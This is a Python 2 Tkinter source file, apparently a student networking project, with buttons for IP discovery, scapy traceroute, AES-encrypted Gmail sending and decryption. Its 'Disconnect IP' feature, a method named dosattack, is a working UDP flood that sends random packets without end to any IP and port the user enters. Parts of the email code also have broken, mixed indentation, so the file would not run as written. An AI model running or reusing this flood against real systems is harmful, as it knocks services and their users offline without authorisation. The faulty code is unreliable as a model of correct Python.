from Tkinter import *
from scapy.all import *
import socket
import random
import ifaddr
import sys
import graphviz
import smtplib
from Crypto.Cipher import AES
import base64
import os
import urllib
import Tkinter as Tk
import hashlib, os
from Crypto.Cipher import AES

base64=False



class Welcome():

    def __init__(self,master):
        self.master = master
        self.master.geometry("500x500")
        self.master.title("CCN Project")
        self.counter=0
        self.button1=Button(self.master,text='Disconnect IP',command=self.dosattack)
        self.button1.grid(row=30,column=30)
        self.button2=Button(self.master,text='Discover IP',command=self.findip)
        self.button2.grid(row=50,column=30)
        self.button3=Button(self.master,text='Quit',command=self.finish)
        self.button3.grid(row=3000,column=2000)
        self.button4=Button(self.master,text='EMAIL',command=self.gotoEmail)
        self.button4.grid(row=70,column=30)
        self.button5=Button(self.master,text='Traceroute',command=self.gototrace)
        self.button5.grid(row=90,column=30)

    def dosattack(self):
        # print self.ip.get()
        # print self.port.get()
        sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #Creates a socket
        bytes=random._urandom(4096) #Creates packet
        ip=raw_input('Enter IP to Disable: ')#The IP we are attacking
        port=input('Enter the Port: ')#Port we direct to attack
        sent=0
        while 1: #Infinitely loops sending packets to the port until the program is exited.
            sock.sendto(bytes,(ip,port))
            print "Sent %s amount of packets to %s at port %s." % (sent,ip,port)
            sent= sent + 1

    def findip(self):
        adapters = ifaddr.get_adapters()
        print "**************************** LOCAL ADAPTERS ***********************************"
        for adapter in adapters:
            print "IPs of network adapter " + adapter.nice_name
            for ip in adapter.ips:
                print "%s/%s" % (ip.ip, ip.network_prefix)
        print "************************** NEIGHBOURS CONNECTED *******************************"
        from ipadd import *
        scan_and_print_neighbors(net, interface)

    
    def gotoEmail(self):
        root2=Toplevel(self.master)
        myGUI=Email(root2)

    def gototrace(self):
        root3=Toplevel(self.master)
        myGUI=Trace(root3)

    
    def finish(self):
        self.master.destroy()


class Email():


    def __init__(self,master):
    	self.master=master
        self.master.geometry("500x500")
        self.master.configure(background="green")
        self.master.title("EMAIL")
        self.content=StringVar()
        self.l1=Label(self.master,text="Content")
        self.conentry=Entry(self.master,textvariable=self.content)
        self.l1.grid(row=9,column=0)
        self.conentry.grid(row=9,column=2)
        self.l2=Label(self.master,text="Login Email")
        self.emaillog=StringVar()
        self.emaillogentry=Entry(self.master, textvariable=self.emaillog)
        self.l2.grid(row=3,column=0)
        self.emaillogentry.grid(row=3,column=2)
        self.password1=StringVar()
        self.l3=Label(self.master,text="Password")
        self.passwordentry=Entry(self.master, show="*", textvariable=self.password1)
        self.passwordentry.grid(row=5,column=2)
        self.l3.grid(row=5,column=0)
        self.l4=Label(self.master,text="Receiver Email")
        self.emailrec=StringVar()
        self.emailrecentry=Entry(self.master, textvariable=self.emailrec)
        self.emailrecentry.grid(row=7,column=2)
        self.l4.grid(row=7,column=0)
        self.key=StringVar()
        self.keyentry=Entry(self.master,show="*",textvariable=self.key)
        self.keyentry.grid(row=11,column=2)
        self.l5=Label(self.master,text="Key")
        self.l5.grid(row=11,column=0)
        self.button1=Button(self.master,text="Quit",command=self.myquit)
        self.button1.grid(row=15,column=2)
        self.button2=Button(self.master,text="Send Mail!",command=self.sendmail)
        self.button2.grid(row=13,column=2)
        self.button3=Button(self.master,text='Decrypt',command=self.gotodecrypt)
        self.button3.grid(row=17,column=2)



    def sendmail(self):
    	base64=False
        mail=smtplib.SMTP('smtp.gmail.com',587)
        recemail=self.emailrec.get()
        cont=self.content.get()
        SALT_LENGTH = 32
        DERIVATION_ROUNDS=1337
        BLOCK_SIZE = 16
        KEY_SIZE = 32
        MODE = AES.MODE_CBC 
        salt = os.urandom(SALT_LENGTH)
        iv = os.urandom(BLOCK_SIZE)
        paddingLength = 16 - (len(cont) % 16)
        paddedPlaintext = cont+chr(paddingLength)*paddingLength
        derivedKey = self.key.get()
        for i in range(0,DERIVATION_ROUNDS):
            derivedKey = hashlib.sha256(derivedKey+salt).digest()
        derivedKey = derivedKey[:KEY_SIZE]
        cipherSpec = AES.new(derivedKey, MODE, iv)
        ciphertext = cipherSpec.encrypt(paddedPlaintext)
        ciphertext = ciphertext + iv + salt
		# if(base64==True):
		# 		ciphertext1= base64.b64encode(ciphertext)
		# else:
	ciphertext1= ciphertext.encode("hex")
	logemail=self.emaillog.get()
	passw=self.password1.get()
	mail.ehlo()
	mail.starttls()
	mail.login(logemail,passw)
	mail.sendmail(logemail,recemail,ciphertext1)
		# res,unans = traceroute(['recemail'])
		# return res.graph()
    	mail.close()

    def gotodecrypt(self):
        root4=Toplevel(self.master)
        myGUI=Decrypt(root4)
                
    def myquit(self):
        self.master.destroy()

class Trace():


    def __init__(self,master):
        self.master=master
        self.master.geometry("500x500")
        self.master.title("Traceroute")
        self.master.configure(background="blue")
        self.webaddress=StringVar()
        self.myentry=Entry(self.master,textvariable=self.webaddress)
        self.myentry.grid(row=1,column=0)
        self.button1=Button(self.master,text="Trace",command=self.traceip)
        self.button1.grid(row=1,column=5)
        self.button2=Button(self.master,text="Quit",command=self.finish)
        self.button2.grid(row=7,column=0)


    def traceip(self):
        res,unans = traceroute([self.webaddress.get()],dport=[80,443],maxttl=20,retry=-2)
        # print(cont)
        return res.graph()

    def finish(self):
        self.master.destroy()

class Decrypt():
    

	def __init__(self,master):
		self.master=master
		self.master.geometry("500x500")
		self.master.title("Decryption")
		self.content=StringVar()
		self.l1=Label(self.master,text="Encrypted Content")
		self.conentry=Entry(self.master,textvariable=self.content)
		self.l1.grid(row=3,column=0)
		self.conentry.grid(row=3,column=2)
		self.l2=Label(self.master,text="Key")
		self.keyentry=StringVar()
		self.emaillogentry=Entry(self.master, textvariable=self.keyentry)
		self.l2.grid(row=5,column=0)
		self.emaillogentry.grid(row=5,column=2)
		self.button6=Button(self.master,text="Decrypt",command=self.AESdecrypt)
		self.button6.grid(row=7,column=5)
		self.button7=Button(self.master,text="Quit",command=self.finish)
		self.button7.grid(row=9,column=5)

	def AESdecrypt(self):
		base64=False
		SALT_LENGTH = 32
		DERIVATION_ROUNDS=1337
		BLOCK_SIZE = 16
		KEY_SIZE = 32
		MODE = AES.MODE_CBC
		ciphertext=self.content.get()
		password=self.keyentry.get()	     
		if base64:
			import base64
			decodedCiphertext = base64.b64decode(ciphertext)
		else:
			decodedCiphertext = ciphertext.decode("hex")
		startIv = len(decodedCiphertext)-BLOCK_SIZE-SALT_LENGTH
		startSalt = len(decodedCiphertext)-SALT_LENGTH
		data, iv, salt = decodedCiphertext[:startIv], decodedCiphertext[startIv:startSalt], decodedCiphertext[startSalt:]
		derivedKey = password
		for i in range(0, DERIVATION_ROUNDS):
		    derivedKey = hashlib.sha256(derivedKey+salt).digest()
		derivedKey = derivedKey[:KEY_SIZE]
		cipherSpec = AES.new(derivedKey, MODE, iv)
		plaintextWithPadding = cipherSpec.decrypt(data)
		paddingLength = ord(plaintextWithPadding[-1])
		plaintext = plaintextWithPadding[:-paddingLength]
		print plaintext
	
	def finish(self):
		self.master.destroy()

		


def main():
    root=Tk.Tk()
    back_image=Tk.PhotoImage(file="bak.gif")
    background_label = Tk.Label(root, image=back_image)
    background_label.place(x=0, y=0, relwidth=1, relheight=1)
    myGUIWelcome=Welcome(root)
    # myemail=Email(root2)
    root.mainloop()

if __name__== '__main__':
    main()
